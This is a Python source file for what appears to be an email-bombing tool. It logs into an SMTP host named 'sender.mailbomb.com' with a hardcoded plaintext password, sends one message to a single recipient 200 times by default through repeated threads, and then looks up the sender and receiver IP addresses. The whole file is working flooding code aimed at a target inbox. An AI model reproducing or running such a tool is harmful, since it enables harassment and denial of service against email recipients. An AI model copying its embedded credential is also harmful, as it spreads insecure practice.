from threading import Thread
from modules.sendemail import send
import smtplib

import socket

class Sender(object):

    def __init__(self, email_sender, email_receiver, email_title, email_content, thread_number=200):
        self.thread_number:int = thread_number
        self.args:list = [None, email_sender, email_receiver, email_title, email_content]

    def work(self):

        mail_host = 'sender.mailbomb.com'
        mail_port = 25
        mail_user = 'sender'
        mail_pass = 'Bleishiyan*'

        email_client = smtplib.SMTP(mail_host, mail_port)
        # email_client.set_debuglevel(1)
        email_client.login(mail_user, mail_pass)

        self.args[0] = email_client

        for i in range(self.thread_number):
            t = Thread(target=send, args=self.args)
            t.daemon = False
            t.start()
            t.join()
        email_client.quit()
        print('多线程结束。')

        sender_ip = socket.getaddrinfo(mail_host, port=mail_port)[0][-1]
        receiver_ip = socket.getaddrinfo(self.args[2].split('@')[-1], port=110)[0][-1]
        return {
            'sender_ip': sender_ip,
            'receiver_ip': receiver_ip,
            'thread_name': self.thread_number
        }